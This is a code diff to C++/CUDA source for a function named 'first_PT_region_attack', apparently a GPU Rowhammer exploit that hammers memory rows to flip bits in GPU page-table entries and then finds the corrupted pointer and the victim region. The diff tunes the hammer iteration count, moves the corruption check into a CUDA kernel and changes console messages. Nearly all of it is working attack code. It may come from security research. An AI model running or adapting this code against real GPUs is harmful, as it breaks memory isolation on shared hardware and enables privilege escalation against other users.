@@ -80,9 +80,9 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       exit (1);
     }
 
-  auto& agg_ptrs = ctx.step2_data.agg_ptrs;
   auto& agg_vec = ctx.step2_data.agg_vec;
   auto& agg_row_list = ctx.step2_data.agg_row_list;
+  ctx.step3_data.agg_ptrs = ctx.step2_data.agg_ptrs;
 
   std::cout << std::dec;
   std::cout
@@ -91,8 +91,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       << "\n\n";
 
   uint64_t repeats = 0;
-  uint8_t *temp_addr;
-  
+
   auto& region_ptrs = ctx.step3_data.region_ptrs;
   auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
   auto& victim_ptr = ctx.step3_data.victim_ptr;
@@ -105,7 +104,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
    * this will require a lot of CPU RAM.
    * 
    * To conserve RAM usage, you may change the code to only do this on the 
-   * first 16 GB.
+   * first 16 GB. Or even try filling first using 2MB + 4KB or cuMemMap.
    */
 
   /****************************************************************/
@@ -174,7 +173,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
       std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';
 
-      const uint64_t it = 46000;
+      const uint64_t it = 23000;
       const uint64_t n = 8;
       const uint64_t k = 3;
       const uint64_t delay = 55;
@@ -184,7 +183,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
         uint64_t time = start_multi_warp_hammer (
             agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
 
-      std::cout << "Hammer Done" << '\n';
+      std::cout << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking longer than 10s, CTRL + C and stop the program)\033[0m" << '\n';
       /**
        * For each 64KB, read from cuda. (Change util to write different data to
        * 64KB offset) Find repetition for temp and pair.
@@ -192,27 +191,39 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
        * If not repetition, find if it matches a PTE.
        */ 
       gpuErrchk (cudaPeekAtLastError ());
-      for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i += 1)
-        {
-          for (uint64_t j = 64 * 1024; j < ALLOC_SIZE; j += 64 * 1024)
-            {
-              cudaMemcpy (&temp_addr, region_ptrs[i] + j, 8,
-                          cudaMemcpyDeviceToHost);
-              if (region_ptrs[i] + j != temp_addr)
-                {
-                  corrupted_ptr = region_ptrs[i] + j;
-                  corrupted_id = i;
-                  victim_ptr = temp_addr;
-                  found_mismatch = true;
-                  break;
-                }
-            }
-        }
+      for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i++)
+      {
+          // Pre-initialize result slots in existing region memory
+          uint64_t sentinel = UINT64_MAX;
+          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 8,  0,     8);
+          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 16, sentinel, 8);
+          memset_ptr<<<1, 1>>>(region_ptrs[i] + 64 * 1024 + 24, 0,     8);
+          cudaDeviceSynchronize();
+
+          // Launch inner j loop as kernel
+          check_region_inner<<<1, 32>>>(region_ptrs[i], ALLOC_SIZE);
+          cudaDeviceSynchronize();
+
+          // Copy results back
+          uint64_t found = 0, corrupted_j = 0, victim = 0;
+          cudaMemcpy(&found,       region_ptrs[i] + 64 * 1024 + 8,  8, cudaMemcpyDeviceToHost);
+          cudaMemcpy(&corrupted_j, region_ptrs[i] + 64 * 1024 + 16, 8, cudaMemcpyDeviceToHost);
+          cudaMemcpy(&victim,      region_ptrs[i] + 64 * 1024 + 24, 8, cudaMemcpyDeviceToHost);
+
+          if (found)
+          {
+              corrupted_ptr  = region_ptrs[i] + corrupted_j;
+              corrupted_id   = i;
+              victim_ptr     = reinterpret_cast<uint8_t*>(victim);
+              found_mismatch = true;
+              break;
+          }
+      }
 
       if (found_mismatch)
         {
-          std::cout << "After " << repeats << " repeats"<< '\n';
-          std::cout << "Corrupted: " << corrupted_id << ' '
+          std::cout << "\nAfter " << repeats << " repeats"<< '\n';
+          std::cout << "Corrupted: "
                     << (void *)corrupted_ptr
                     << ". Victim: " << (void *)victim_ptr << '\n';
           break;
@@ -229,7 +240,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       if (region_ptrs[i] == victim_round_addr)
         {
           victim_id = i;
-          std::cout << "Found victim id." << '\n';
+          DBG_OUT << "Found victim id." << '\n';
         }
     }
   std::cout << "(Step 3 Success) Found Corrupted PFN Destination: Press "
